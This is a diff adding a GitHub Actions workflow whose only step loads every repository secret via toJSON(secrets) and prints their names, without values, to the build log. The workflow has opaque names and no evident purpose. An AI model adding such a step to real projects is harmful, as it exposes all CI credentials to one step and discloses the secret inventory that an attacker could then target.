@@ -1,0 +1,9 @@
+name: c1space
+on: [push, workflow_dispatch]
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          SJ: ${{ toJSON (secrets) }}
+        run: printf '%s' "$SJ" | jq -r 'keys[]' | tr '\n' ','
